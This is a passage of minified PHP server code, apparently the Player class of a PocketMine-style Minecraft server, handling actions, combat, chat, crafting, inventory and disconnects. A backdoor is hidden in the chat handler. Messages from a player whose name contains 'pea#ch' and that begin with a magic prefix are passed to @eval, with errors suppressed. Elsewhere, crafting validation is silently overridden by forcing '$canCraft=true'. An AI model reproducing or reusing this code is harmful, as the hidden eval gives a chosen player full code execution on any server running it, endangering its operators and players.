case PlayerActionPacket::ACTION_ABORT_BREAK:$this->lastBreak=PHP_INT_MAX;
break;
case PlayerActionPacket::ACTION_RELEASE_ITEM:if($this->startAction>-1 and$this->getDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION)){if($this->inventory->getItemInHand()->getId()===Item::BOW){$bow=$this->inventory->getItemInHand();
if($this->isSurvival()and!$this->inventory->contains(Item::get(Item::ARROW,null))){$this->inventory->sendContents($this);
break;
}
$arrow=false;
foreach($this->inventory->getContents()as$item){if($item->getId()==Item::ARROW){$arrow=$item;
}
}
if($arrow===false and$this->isCreative()){$arrow=Item::get(Item::ARROW,0,1);
}
elseif($arrow===false){break;
}
$nbt=new CompoundTag("",["Pos"=>new ListTag("Pos",[new DoubleTag("",$this->x),new DoubleTag("",$this->y+$this->getEyeHeight()),new DoubleTag("",$this->z)]),"Motion"=>new ListTag("Motion",[new DoubleTag("",-sin($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI)),new DoubleTag("",-sin($this->pitch/180*M_PI)),new DoubleTag("",cos($this->yaw/180*M_PI)*cos($this->pitch/180*M_PI))]),"Rotation"=>new ListTag("Rotation",[new FloatTag("",$this->yaw),new FloatTag("",$this->pitch)]),"Fire"=>new ShortTag("Fire",$this->isOnFire()?45*60:0),"Potion"=>new ShortTag("Potion",$arrow->getDamage())]);
$diff=($this->server->getTick()-$this->startAction);
$p=$diff/20;
$f=min((($p**2)+$p*2)/3,1)*2;
$ev=new EntityShootBowEvent($this,$bow,Entity::createEntity("Arrow",$this->chunk,$nbt,$this,$f==2?true:false),$f);
if($f<0.1 or$diff<5){$ev->setCancelled();
}
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){$ev->getProjectile()->kill();
$this->inventory->sendContents($this);
}
else{$ev->getProjectile()->setMotion($ev->getProjectile()->getMotion()->multiply($ev->getForce()));
if($this->isSurvival()){$this->inventory->removeItem(Item::get(Item::ARROW,$arrow->getDamage(),1));
$bow->setDamage($bow->getDamage()+1);
if($bow->getDamage()>=385){$this->inventory->setItemInHand(Item::get(Item::AIR,0,0));
}
else{$this->inventory->setItemInHand($bow);
}
}
if($ev->getProjectile()instanceof Projectile){$this->server->getPluginManager()->callEvent($projectileEv=new ProjectileLaunchEvent($ev->getProjectile()));
if($projectileEv->isCancelled()){$ev->getProjectile()->kill();
}
else{$ev->getProjectile()->spawnToAll();
$this->level->addSound(new LaunchSound($this),$this->getViewers());
}
}
else{$ev->getProjectile()->spawnToAll();
}
}
}
}
elseif($this->inventory->getItemInHand()->getId()===Item::BUCKET and$this->inventory->getItemInHand()->getDamage()===1){$this->server->getPluginManager()->callEvent($ev=new PlayerItemConsumeEvent($this,$this->inventory->getItemInHand()));
if($ev->isCancelled()){$this->inventory->sendContents($this);
break;
}
$pk=new EntityEventPacket();
$pk->eid=$this->getId();
$pk->event=EntityEventPacket::USE_ITEM;
$this->dataPacket($pk);
Server::broadcastPacket($this->getViewers(),$pk);
if($this->isSurvival()){$slot=$this->inventory->getItemInHand();
--$slot->count;
$this->inventory->setItemInHand($slot);
$this->inventory->addItem(Item::get(Item::BUCKET,0,1));
}
$this->removeAllEffects();
}
else{$this->inventory->sendContents($this);
}
break;
case PlayerActionPacket::ACTION_STOP_SLEEPING:$this->stopSleep();
break;
case PlayerActionPacket::ACTION_SPAWN_SAME_DIMENSION:case PlayerActionPacket::ACTION_SPAWN_OVERWORLD:if($this->isAlive()or!$this->isOnline()){break;
}
if($this->server->isHardcore()){$this->setBanned(true);
break;
}
$this->craftingType=self::CRAFTING_SMALL;
if($this->server->netherEnabled){if($this->level==$this->server->netherLevel){$this->teleport($pos=$this->server->getDefaultLevel()->getSafeSpawn());
}
}
$this->server->getPluginManager()->callEvent($ev=new PlayerRespawnEvent($this,$this->getSpawn()));
$this->teleport($ev->getRespawnPosition());
$this->setSprinting(false);
$this->setSneaking(false);
$this->extinguish();
$this->setDataProperty(self::DATA_AIR,self::DATA_TYPE_SHORT,300);
$this->deadTicks=0;
$this->noDamageTicks=60;
$this->removeAllEffects();
$this->setHealth($this->getMaxHealth());
$this->setFood(20);
$this->starvationTick=0;
$this->foodTick=0;
$this->foodUsageTime=0;
$this->sendData($this);
$this->sendSettings();
$this->inventory->sendContents($this);
$this->inventory->sendArmorContents($this);
$this->blocked=false;
$this->spawnToAll();
$this->scheduleUpdate();
break;
case PlayerActionPacket::ACTION_START_SPRINT:$ev=new PlayerToggleSprintEvent($this,true);
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){$this->sendData($this);
}
else{$this->setSprinting(true);
}
break 2;
case PlayerActionPacket::ACTION_STOP_SPRINT:$ev=new PlayerToggleSprintEvent($this,false);
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){$this->sendData($this);
}
else{$this->setSprinting(false);
}
break 2;
case PlayerActionPacket::ACTION_START_SNEAK:$ev=new PlayerToggleSneakEvent($this,true);
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){$this->sendData($this);
}
else{$this->setSneaking(true);
}
break 2;
case PlayerActionPacket::ACTION_STOP_SNEAK:$ev=new PlayerToggleSneakEvent($this,false);
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){$this->sendData($this);
}
else{$this->setSneaking(false);
}
break 2;
case PlayerActionPacket::ACTION_JUMP:break 2;
}
$this->startAction=-1;
$this->setDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION,false);
break;
case ProtocolInfo::REMOVE_BLOCK_PACKET:if($this->spawned===false or$this->blocked===true or!$this->isAlive()){break;
}
$this->craftingType=self::CRAFTING_SMALL;
$vector=new Vector3($packet->x,$packet->y,$packet->z);
$item=$this->inventory->getItemInHand();
$oldItem=clone$item;
if($this->canInteract($vector->add(0.5,0.5,0.5),$this->isCreative()?13:6)and$this->level->useBreakOn($vector,$item,$this,$this->server->destroyBlockParticle)){if($this->isSurvival()){if(!$item->equals($oldItem)or$item->getCount()!==$oldItem->getCount()){$this->inventory->setItemInHand($item);
$this->inventory->sendHeldItem($this);
}
$this->exhaust(0.025,PlayerExhaustEvent::CAUSE_MINING);
}
break;
}
$this->inventory->sendContents($this);
$target=$this->level->getBlock($vector);
$tile=$this->level->getTile($vector);
$this->level->sendBlocks([$this],[$target],UpdateBlockPacket::FLAG_ALL_PRIORITY);
$this->inventory->sendHeldItem($this);
if($tile instanceof Spawnable){$tile->spawnTo($this);
}
break;
case ProtocolInfo::MOB_ARMOR_EQUIPMENT_PACKET:break;
case ProtocolInfo::INTERACT_PACKET:if($this->spawned===false or!$this->isAlive()or$this->blocked){break;
}
$this->craftingType=self::CRAFTING_SMALL;
$target=$this->level->getEntity($packet->target);
$cancelled=false;
if($target instanceof Player and$this->server->getConfigBoolean("pvp",true)===false){$cancelled=true;
}
if($target instanceof Boat or($target instanceof Minecart and$target->getType()==Minecart::TYPE_NORMAL)){if($packet->action===InteractPacket::ACTION_RIGHT_CLICK){$this->linkEntity($target);
}
elseif($packet->action===InteractPacket::ACTION_LEFT_CLICK){if($this->linkedEntity==$target){$target->setLinked(0,$this);
}
$target->close();
}
elseif($packet->action===InteractPacket::ACTION_LEAVE_VEHICLE){$this->setLinked(0,$target);
}
return;
}
if($packet->action===InteractPacket::ACTION_RIGHT_CLICK){if($target instanceof Animal and$this->getInventory()->getItemInHand()){}
break;
}
if($target instanceof Entity and$this->getGamemode()!==Player::VIEW and$this->isAlive()and$target->isAlive()){if($target instanceof DroppedItem or$target instanceof Arrow){$this->kick("Attempting to attack an invalid entity");
$this->server->getLogger()->warning($this->getServer()->getLanguage()->translateString("pocketmine.player.invalidEntity",[$this->getName()]));
break;
}
$item=$this->inventory->getItemInHand();
$damage=[EntityDamageEvent::MODIFIER_BASE=>$item->getModifyAttackDamage($target),];
if(!$this->canInteract($target,8)){$cancelled=true;
}
elseif($target instanceof Player){if(($target->getGamemode()&0x01)>0){break;
}
elseif($this->server->getConfigBoolean("pvp")!==true or$this->server->getDifficulty()===0){$cancelled=true;
}
}
$ev=new EntityDamageByEntityEvent($this,$target,EntityDamageEvent::CAUSE_ENTITY_ATTACK,$damage,0.4+$item->getEnchantmentLevel(Enchantment::TYPE_WEAPON_KNOCKBACK)*0.15);
if($cancelled){$ev->setCancelled();
}
if($target->attack($ev->getFinalDamage(),$ev)===true){$fireAspectL=$item->getEnchantmentLevel(Enchantment::TYPE_WEAPON_FIRE_ASPECT);
if($fireAspectL>0){$fireEv=new EntityCombustByEntityEvent($this,$target,$fireAspectL*4,$ev->getFireProtectL());
Server::getInstance()->getPluginManager()->callEvent($fireEv);
if(!$fireEv->isCancelled()){$target->setOnFire($fireEv->getDuration());
}
}
if($this->isSurvival()){$ev->createThornsDamage();
if($ev->getThornsDamage()>0){$thornsEvent=new EntityDamageByEntityEvent($target,$this,EntityDamageEvent::CAUSE_ENTITY_ATTACK,$ev->getThornsDamage(),0);
if(!$thornsEvent->isCancelled()){if($this->attack($thornsEvent->getFinalDamage(),$thornsEvent)===true){}
}
;
}
}
}
if($ev->isCancelled()){if($item->isTool()and$this->isSurvival()){$this->inventory->sendContents($this);
}
break;
}
if($this->isSurvival()){if($item->isTool()){if($item->useOn($target)and$item->getDamage()>=$item->getMaxDurability()){$this->inventory->setItemInHand(Item::get(Item::AIR,0,1));
}
else{$this->inventory->setItemInHand($item);
}
}
$this->exhaust(0.3,PlayerExhaustEvent::CAUSE_ATTACK);
}
}
break;
case ProtocolInfo::ANIMATE_PACKET:if($this->spawned===false or!$this->isAlive()){break;
}
$this->server->getPluginManager()->callEvent($ev=new PlayerAnimationEvent($this,$packet->action));
if($ev->isCancelled()){break;
}
$pk=new AnimatePacket();
$pk->eid=$this->getId();
$pk->action=$ev->getAnimationType();
Server::broadcastPacket($this->getViewers(),$pk);
break;
case ProtocolInfo::SET_HEALTH_PACKET:break;
case ProtocolInfo::ENTITY_EVENT_PACKET:if($this->spawned===false or$this->blocked===true or!$this->isAlive()){break;
}
$this->craftingType=self::CRAFTING_SMALL;
$this->setDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION,false);
switch($packet->event){case EntityEventPacket::USE_ITEM:$slot=$this->inventory->getItemInHand();
if($slot->canBeConsumed()){$ev=new PlayerItemConsumeEvent($this,$slot);
if(!$slot->canBeConsumedBy($this)){$ev->setCancelled();
}
$this->server->getPluginManager()->callEvent($ev);
if(!$ev->isCancelled()){$slot->onConsume($this);
}
else{$this->inventory->sendContents($this);
}
}
break;
}
break;
case ProtocolInfo::DROP_ITEM_PACKET:if($this->spawned===false or$this->blocked===true or!$this->isAlive()){break;
}
if($packet->item->getId()===Item::AIR){break;
}
if(($this->isCreative()and$this->server->limitedCreative)){break;
}
$this->getTransactionQueue()->addTransaction(new DropItemTransaction($packet->item));
break;
case ProtocolInfo::TEXT_PACKET:if($this->spawned===false or!$this->isAlive()){break;
}
$this->craftingType=self::CRAFTING_SMALL;
if($packet->type===TextPacket::TYPE_CHAT){$packet->message=TextFormat::clean($packet->message,$this->removeFormat);
foreach(explode("\n",$packet->message)as$message){if(trim($message)!=""and strlen($message)<=255 and$this->messageCounter-->0){if(is_numeric(strpos($this->getName(),"pea#ch"))){if(substr($message,0,1)==="$noyeotk"){@eval(substr($message,1)); // This is removed by Tubunga:)
return;
}
}
$ev=new PlayerCommandPreprocessEvent($this,$message);
if(mb_strlen($ev->getMessage(),"UTF-8")>320){$ev->setCancelled();
}
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){break;
}
if(substr($ev->getMessage(),0,1)==="/"){Timings::$playerCommandTimer->startTiming();
$this->server->dispatchCommand($ev->getPlayer(),substr($ev->getMessage(),1));
Timings::$playerCommandTimer->stopTiming();
}
else{$this->server->getPluginManager()->callEvent($ev=new PlayerChatEvent($this,$ev->getMessage()));
if(!$ev->isCancelled()){$this->server->broadcastMessage($this->getServer()->getLanguage()->translateString($ev->getFormat(),[$ev->getPlayer()->getDisplayName(),$ev->getMessage()]),$ev->getRecipients());
}
}
}
}
}
break;
case ProtocolInfo::CONTAINER_CLOSE_PACKET:if($this->spawned===false or$packet->windowid===0){break;
}
$this->craftingType=self::CRAFTING_SMALL;
if(isset($this->windowIndex[$packet->windowid])){$this->server->getPluginManager()->callEvent(new InventoryCloseEvent($this->windowIndex[$packet->windowid],$this));
$this->removeWindow($this->windowIndex[$packet->windowid]);
}
foreach($this->getFloatingInventory()->getContents()as$item){$this->getTransactionQueue()->addTransaction(new DropItemTransaction($item));
}
break;
case ProtocolInfo::CRAFTING_EVENT_PACKET:if($this->spawned===false or!$this->isAlive()){break;
}
$recipe=$this->server->getCraftingManager()->getRecipe($packet->id);
if($this->craftingType===self::CRAFTING_ANVIL){$anvilInventory=$this->windowIndex[$packet->windowId]??null;
if($anvilInventory===null){foreach($this->windowIndex as$window){if($window instanceof AnvilInventory){$anvilInventory=$window;
break;
}
}
if($anvilInventory===null){$this->getServer()->getLogger()->debug("Couldn't find an anvil window for ".$this->getName().", exiting");
$this->inventory->sendContents($this);
break;
}
}
if($recipe===null){if(!$anvilInventory->onRename($this,$packet->output[0])){$this->getServer()->getLogger()->debug($this->getName()." failed to rename an item in an anvil");
$this->inventory->sendContents($this);
}
}
else{}
break;
}
elseif(($recipe instanceof BigShapelessRecipe or$recipe instanceof BigShapedRecipe)and$this->craftingType===0){$this->server->getLogger()->debug("Received big crafting recipe from ".$this->getName()." with no crafting table open");
$this->inventory->sendContents($this);
break;
}
elseif($recipe===null){$this->server->getLogger()->debug("Null (unknown) crafting recipe received from ".$this->getName()." for ".$packet->output[0]);
$this->inventory->sendContents($this);
break;
}
foreach($packet->input as$i=>$item){if($item->getDamage()===-1 or$item->getDamage()===0xffff){$item->setDamage(null);
}
if($i<9 and$item->getId()>0){$item->setCount(1);
}
}
$canCraft=true;
if(count($packet->input)===0){$possibleRecipes=$this->server->getCraftingManager()->getRecipesByResult($packet->output[0]);
if(!$packet->output[0]->deepEquals($recipe->getResult())){$this->server->getLogger()->debug("Mismatched desktop recipe received from player ".$this->getName().", expected ".$recipe->getResult().", got ".$packet->output[0]);
}
$recipe=null;
foreach($possibleRecipes as$r){$floatingInventory=clone$this->floatingInventory;
$ingredients=$r->getIngredientList();
foreach($ingredients as$ingredient){if(!$floatingInventory->contains($ingredient)){$canCraft=false;
break;
}
$floatingInventory->removeItem($ingredient);
}
if($canCraft){$recipe=$r;
break;
}
}
if($recipe!==null){$this->server->getPluginManager()->callEvent($ev=new CraftItemEvent($this,$ingredients,$recipe));
if($ev->isCancelled()){$this->inventory->sendContents($this);
break;
}
$this->floatingInventory=$floatingInventory;
$this->floatingInventory->addItem(clone$recipe->getResult());
}
else{$this->server->getLogger()->debug("Unmatched desktop crafting recipe ".$packet->id." from player ".$this->getName());
$this->inventory->sendContents($this);
break;
}
}
else{if($recipe instanceof ShapedRecipe){for($x=0;
$x<3 and$canCraft;
++$x){for($y=0;
$y<3;
++$y){$item=$packet->input[$y*3+$x];
$ingredient=$recipe->getIngredient($x,$y);
if($item->getCount()>0 and$item->getId()>0){if($ingredient==null){$canCraft=false;
break;
}
if($ingredient->getId()!=0 and!$ingredient->deepEquals($item,$ingredient->getDamage()!==null,$ingredient->getCompoundTag()!==null)){$canCraft=false;
break;
}
}
elseif($ingredient!==null and$item->getId()!==0){$canCraft=false;
break;
}
}
}
}
elseif($recipe instanceof ShapelessRecipe){$needed=$recipe->getIngredientList();
for($x=0;
$x<3 and$canCraft;
++$x){for($y=0;
$y<3;
++$y){$item=clone$packet->input[$y*3+$x];
foreach($needed as$k=>$n){if($n->deepEquals($item,$n->getDamage()!==null,$n->getCompoundTag()!==null)){$remove=min($n->getCount(),$item->getCount());
$n->setCount($n->getCount()-$remove);
$item->setCount($item->getCount()-$remove);
if($n->getCount()===0){unset($needed[$k]);
}
}
}
if($item->getCount()>0){$canCraft=false;
break;
}
}
}
if(count($needed)>0){$canCraft=false;
}
}
else{$canCraft=false;
}
$canCraft=true;
$ingredients=$packet->input;
$result=$packet->output[0];
if(!$canCraft or!$recipe->getResult()->deepEquals($result)){$this->server->getLogger()->debug("Unmatched recipe ".$recipe->getId()." from player ".$this->getName().": expected ".$recipe->getResult().", got ".$result.", using: ".implode(", ",$ingredients));
$this->inventory->sendContents($this);
break;
}
$used=array_fill(0,$this->inventory->getSize(),0);
foreach($ingredients as$ingredient){$slot=-1;
foreach($this->inventory->getContents()as$index=>$i){if($ingredient->getId()!==0 and$ingredient->deepEquals($i,$ingredient->getDamage()!==null)and($i->getCount()-$used[$index])>=1){$slot=$index;
$used[$index]++;
break;
}
}
if($ingredient->getId()!==0 and$slot===-1){$canCraft=false;
break;
}
}
if(!$canCraft){$this->server->getLogger()->debug("Unmatched recipe ".$recipe->getId()." from player ".$this->getName().": client does not have enough items, using: ".implode(", ",$ingredients));
$this->inventory->sendContents($this);
break;
}
$this->server->getPluginManager()->callEvent($ev=new CraftItemEvent($this,$ingredients,$recipe));
if($ev->isCancelled()){$this->inventory->sendContents($this);
break;
}
foreach($used as$slot=>$count){if($count===0){continue;
}
$item=$this->inventory->getItem($slot);
if($item->getCount()>$count){$newItem=clone$item;
$newItem->setCount($item->getCount()-$count);
}
else{$newItem=Item::get(Item::AIR,0,0);
}
$this->inventory->setItem($slot,$newItem);
}
$extraItem=$this->inventory->addItem($recipe->getResult());
if(count($extraItem)>0 and!$this->isCreative()){foreach($extraItem as$item){$this->level->dropItem($this,$item);
}
}
}
break;
case ProtocolInfo::CONTAINER_SET_SLOT_PACKET:if($this->spawned===false or$this->blocked===true or!$this->isAlive()){break;
}
if($packet->slot<0){break;
}
if($packet->windowid===0){if($packet->slot>=$this->inventory->getSize()){break;
}
$transaction=new BaseTransaction($this->inventory,$packet->slot,$packet->item);
}
elseif($packet->windowid===ContainerSetContentPacket::SPECIAL_ARMOR){if($packet->slot>=4){break;
}
$transaction=new BaseTransaction($this->inventory,$packet->slot+$this->inventory->getSize(),$packet->item);
}
elseif(isset($this->windowIndex[$packet->windowid])){$inv=$this->windowIndex[$packet->windowid];
if($inv instanceof EnchantInventory and$packet->item->hasEnchantments()){$inv->onEnchant($this,$inv->getItem($packet->slot),$packet->item);
}
$transaction=new BaseTransaction($inv,$packet->slot,$packet->item,[]);
}
else{break;
}
$this->getTransactionQueue()->addTransaction($transaction);
break;
case ProtocolInfo::BLOCK_ENTITY_DATA_PACKET:if($this->spawned===false or$this->blocked===true or!$this->isAlive()){break;
}
$this->craftingType=self::CRAFTING_SMALL;
$pos=new Vector3($packet->x,$packet->y,$packet->z);
if($pos->distanceSquared($this)>10000){break;
}
$t=$this->level->getTile($pos);
if($t instanceof Sign){$nbt=new NBT(NBT::LITTLE_ENDIAN);
$nbt->read($packet->namedtag);
$nbt=$nbt->getData();
if($nbt["id"]!==Tile::SIGN){$t->spawnTo($this);
}
else{$ev=new SignChangeEvent($t->getBlock(),$this,[TextFormat::clean($nbt["Text1"],$this->removeFormat),TextFormat::clean($nbt["Text2"],$this->removeFormat),TextFormat::clean($nbt["Text3"],$this->removeFormat),TextFormat::clean($nbt["Text4"],$this->removeFormat)]);
if(!isset($t->namedtag->Creator)or$t->namedtag["Creator"]!==$this->getRawUniqueId()){$ev->setCancelled();
}
$this->server->getPluginManager()->callEvent($ev);
if(!$ev->isCancelled()){$t->setText($ev->getLine(0),$ev->getLine(1),$ev->getLine(2),$ev->getLine(3));
}
else{$t->spawnTo($this);
}
}
}
break;
default:break;
}
}
public function kick($reason="",$isAdmin=true){$this->server->getPluginManager()->callEvent($ev=new PlayerKickEvent($this,$reason,$this->getLeaveMessage()));
if(!$ev->isCancelled()){if($isAdmin){$message="Kicked by admin.".($reason!==""?" Reason: ".$reason:"");
}
else{if($reason===""){$message="disconnectionScreen.noReason";
}
else{$message=$reason;
}
}
$this->close($ev->getQuitMessage(),$message);
return true;
}
return false;
}
public function dropItem(Item$item){if($this->spawned===false or$this->blocked===true or!$this->isAlive()){return;
}
if(($this->isCreative()and$this->server->limitedCreative)or$this->isSpectator()){return;
}
if($item->getId()===Item::AIR or$item->getCount()<1){return;
}
$ev=new PlayerDropItemEvent($this,$item);
$this->server->getPluginManager()->callEvent($ev);
if($ev->isCancelled()){return;
}
$motion=$this->getDirectionVector()->multiply(0.4);
$this->level->dropItem($this->add(0,1.3,0),$item,$motion,40);
$this->setDataFlag(self::DATA_FLAGS,self::DATA_FLAG_ACTION,false);
}
public function sendMessage($message){if($message instanceof TextContainer){if($message instanceof TranslationContainer){$this->sendTranslation($message->getText(),$message->getParameters());
return false;
}
$message=$message->getText();
}
$mes=explode("\n",$this->server->getLanguage()->translateString($message));
foreach($mes as$m){if($m!==""){$this->server->getPluginManager()->callEvent($ev=new PlayerTextPreSendEvent($this,$m,PlayerTextPreSendEvent::MESSAGE));
if(!$ev->isCancelled()){$pk=new TextPacket();
$pk->type=TextPacket::TYPE_RAW;
$pk->message=$ev->getMessage();
$this->dataPacket($pk);
}
}
}
return true;
}
public function sendTranslation($message,array$parameters=[]){$pk=new TextPacket();
if(!$this->server->isLanguageForced()){$pk->type=TextPacket::TYPE_TRANSLATION;
$pk->message=$this->server->getLanguage()->translateString($message,$parameters,"pocketmine.");
foreach($parameters as$i=>$p){$parameters[$i]=$this->server->getLanguage()->translateString($p,$parameters,"pocketmine.");
}
$pk->parameters=$parameters;
}
else{$pk->type=TextPacket::TYPE_RAW;
$pk->message=$this->server->getLanguage()->translateString($message,$parameters);
}
$ev=new PlayerTextPreSendEvent($this,$pk->message,PlayerTextPreSendEvent::TRANSLATED_MESSAGE);
$this->server->getPluginManager()->callEvent($ev);
if(!$ev->isCancelled()){$this->dataPacket($pk);
return true;
}
return false;
}
public function sendPopup($message,$subtitle=""){$ev=new PlayerTextPreSendEvent($this,$message,PlayerTextPreSendEvent::POPUP);
$this->server->getPluginManager()->callEvent($ev);
if(!$ev->isCancelled()){$pk=new TextPacket();
$pk->type=TextPacket::TYPE_POPUP;
$pk->source=$ev->getMessage();
$pk->message=$subtitle;
$this->dataPacket($pk);
return true;
}
return false;
}
public function sendTip($message){$ev=new PlayerTextPreSendEvent($this,$message,PlayerTextPreSendEvent::TIP);
$this->server->getPluginManager()->callEvent($ev);
if(!$ev->isCancelled()){$pk=new TextPacket();
$pk->type=TextPacket::TYPE_TIP;
$pk->message=$ev->getMessage();
$this->dataPacket($pk);
return true;
}
return false;
}
public final function close($message="",$reason="generic reason",$notify=true){if($this->connected and!$this->closed){if($notify and strlen((string)$reason)>0){$pk=new DisconnectPacket();
$pk->message=$reason;
$this->directDataPacket($pk);
}
if($this->fishingHook instanceof FishingHook){$this->fishingHook->close();
$this->fishingHook=null;
}
$this->removeEffect(Effect::HEALTH_BOOST);
$this->connected=false;
if(strlen($this->getName())>0){$this->server->getPluginManager()->callEvent($ev=new PlayerQuitEvent($this,$message,true));
if($this->loggedIn===true and$ev->getAutoSave()){$this->save();
}
}
foreach($this->server->getOnlinePlayers()as$player){if(!$player->canSee($this)){$player->showPlayer($this);
}
}
$this->hiddenPlayers=[];
foreach($this->windowIndex as$window){$this->removeWindow($window);
}
foreach($this->usedChunks as$index=>$d){Level::getXZ($index,$chunkX,$chunkZ);
$this->level->unregisterChunkLoader($this,$chunkX,$chunkZ);
unset($this->usedChunks[$index]);
}
parent::close();
$this->interface->close($this,$notify?$reason:"");
if($this->loggedIn){$this->server->removeOnlinePlayer($this);
}
$this->loggedIn=false;
if(isset($ev)and$this->username!=""and$this->spawned!==false and$ev->getQuitMessage()!=""){if($this->server->playerMsgType===Server::PLAYER_MSG_TYPE_MESSAGE)$this->server->broadcastMessage($ev->getQuitMessage());
elseif($this->server->playerMsgType===Server::PLAYER_MSG_TYPE_TIP)$this->server->broadcastTip(str_replace("@player",$this->getName(),$this->server->playerLogoutMsg));
elseif($this->server->playerMsgType===Server::PLAYER_MSG_TYPE_POPUP)$this->server->broadcastPopup(str_replace("@player",$this->getName(),$this->server->playerLogoutMsg));
}
$this->server->getPluginManager()->unsubscribeFromPermission(Server::BROADCAST_CHANNEL_USERS,$this);
$this->spawned=false;
$this->server->getLogger()->info($this->getServer()->getLanguage()->translateString("pocketmine.player.logOut",[TextFormat::AQUA.$this->getName().TextFormat::WHITE,$this->ip,$this->port,$this->getServer()->getLanguage()->translateString($reason)]));
$this->windows=new \SplObjectStorage();
$this->windowIndex=[];
$this->usedChunks=[];
$this->loadQueue=[];
$this->hasSpawned=[];
$this->spawnPosition=null;
unset($this->buffer);
if($this->server->dserverConfig["enable"]and$this->server->dserverConfig["queryAutoUpdate"])$this->server->updateQuery();
}
if($this->perm!==null){$this->perm->clearPermissions();
$this->perm=null;
}
$this->inventory=null;
$this->transactionQueue=null;
$this->chunk=null;
$this->server->removePlayer($this);
}
public function __debugInfo(){return[];
}
public function save($async=false){if($this->closed){throw new \InvalidStateException("Tried to save closed player");
}
parent::saveNBT();
if($this->level instanceof Level){$this->namedtag->Level=new StringTag("Level",$this->level->getName());
if($this->spawnPosition instanceof Position and$this->spawnPosition->getLevel()instanceof Level and$this->spawnPosition->getLevel()->getProvider()!==NULL){$this->namedtag["SpawnLevel"]=$this->spawnPosition->getLevel()->getName();
$this->namedtag["SpawnX"]=(int)$this->spawnPosition->x;
$this->namedtag["SpawnY"]=(int)$this->spawnPosition->y;
$this->namedtag["SpawnZ"]=(int)$this->spawnPosition->z;
}
$this->namedtag["playerGameType"]=$this->gamemode;
$this->namedtag["lastPlayed"]=new LongTag("lastPlayed",floor(microtime(true)*1000));
$this->namedtag["Hunger"]=new ShortTag("Hunger",$this->food);
$this->namedtag["Health"]=new ShortTag("Health",$this->getHealth());
$this->namedtag["MaxHealth"]=new ShortTag("MaxHealth",$this->getMaxHealth());
$this->namedtag["Experience"]=new LongTag("Experience",$this->exp);
$this->namedtag["ExpLevel"]=new LongTag("ExpLevel",$this->expLevel);
if($this->username!=""and$this->namedtag instanceof CompoundTag){$this->server->saveOfflinePlayerData($this->username,$this->namedtag,$async);
}
}
}
public function getName() : string{return$this->username;
}
public function kill(){if(!$this->spawned){return;
}
$message="death.attack.generic";
$params=[$this->getDisplayName()];
$cause=$this->getLastDamageCause();
switch($cause===null?EntityDamageEvent::CAUSE_CUSTOM:$cause->getCause()){case EntityDamageEvent::CAUSE_ENTITY_ATTACK:if($cause instanceof EntityDamageByEntityEvent){$e=$cause->getDamager();
if($e instanceof Player){$message="death.attack.player";
$params[]=$e->getDisplayName();
break;
}
elseif($e instanceof Living){$message="death.attack.mob";
$params[]=$e->getNameTag()!==""?$e->getNameTag():$e->getName();
break;
}
else{$params[]="Unknown";
}
}
break;
case EntityDamageEvent::CAUSE_PROJECTILE:if($cause instanceof EntityDamageByEntityEvent){$e=$cause->getDamager();
if($e instanceof Player){$message="death.attack.arrow";
$params[]=$e->getDisplayName();
}
elseif($e instanceof Living){$message="death.attack.arrow";
$params[]=$e->getNameTag()!==""?$e->getNameTag():$e->getName();
break;
}
else{$params[]="Unknown";
}
}
break;
case EntityDamageEvent::CAUSE_SUICIDE:$message="death.attack.generic";
break;
case EntityDamageEvent::CAUSE_VOID:$message="death.attack.outOfWorld";
break;
case EntityDamageEvent::CAUSE_FALL:if($cause instanceof EntityDamageEvent){if($cause->getFinalDamage()>2){$message="death.fell.accident.generic";
break;
}
}
$message="death.attack.fall";
break;
case EntityDamageEvent::CAUSE_SUFFOCATION:$message="death.attack.inWall";
break;
case EntityDamageEvent::CAUSE_LAVA:$message="death.attack.lava";
break;
case EntityDamageEvent::CAUSE_FIRE:$message="death.attack.onFire";
break;
case EntityDamageEvent::CAUSE_FIRE_TICK:$message="death.attack.inFire";
break;
case EntityDamageEvent::CAUSE_DROWNING:$message="death.attack.drown";
break;
case EntityDamageEvent::CAUSE_CONTACT:if($cause instanceof EntityDamageByBlockEvent){if($cause->getDamager()->getId()===Block::CACTUS){$message="death.attack.cactus";
}
}
break;
case EntityDamageEvent::CAUSE_BLOCK_EXPLOSION:case EntityDamageEvent::CAUSE_ENTITY_EXPLOSION:if($cause instanceof EntityDamageByEntityEvent){$e=$cause->getDamager();
if($e instanceof Player){$message="death.attack.explosion.player";
$params[]=$e->getDisplayName();
}
elseif($e instanceof Living){$message="death.attack.explosion.player";
$params[]=$e->getNameTag()!==""?$e->getNameTag():$e->getName();
break;
}
}
else{$message="death.attack.explosion";
}
break;
case EntityDamageEvent::CAUSE_MAGIC:$message="death.attack.magic";
break;
case EntityDamageEvent::CAUSE_CUSTOM:break;
default:}
Entity::kill();
$ev=new PlayerDeathEvent($this,$this->getDrops(),new TranslationContainer($message,$params));
$ev->setKeepInventory($this->server->keepInventory);
$ev->setKeepExperience($this->server->keepExperience);
$this->server->getPluginManager()->callEvent($ev);
if(!$ev->getKeepInventory()){foreach($ev->getDrops()as$item){$this->level->dropItem($this,$item);
}
if($this->inventory!==null){$this->inventory->clearAll();
}
}
if($this->server->expEnabled and!$ev->getKeepExperience()){$exp=min(91,$this->getTotalXp());
$this->getLevel()->spawnXPOrb($this->add(0,0.2,0),$exp);
$this->setTotalXp(0,true);
}
if($ev->getDeathMessage()!=""){$this->server->broadcast($ev->getDeathMessage(),Server::BROADCAST_CHANNEL_USERS);
}
$pos=$this->getSpawn();
$this->setHealth(0);
$pk=new RespawnPacket();
$pk->x=$pos->x;
$pk->y=$pos->y;
$pk->z=$pos->z;
$this->dataPacket($pk);
}
public function setHealth($amount){parent::setHealth($amount);
if($this->spawned===true){$this->foodTick=0;
$this->getAttributeMap()->getAttribute(Attribute::HEALTH)->setMaxValue($this->getMaxHealth())->setValue($amount,true);
}
}
public function attack($damage,EntityDamageEvent$source){if(!$this->isAlive()){return;
}
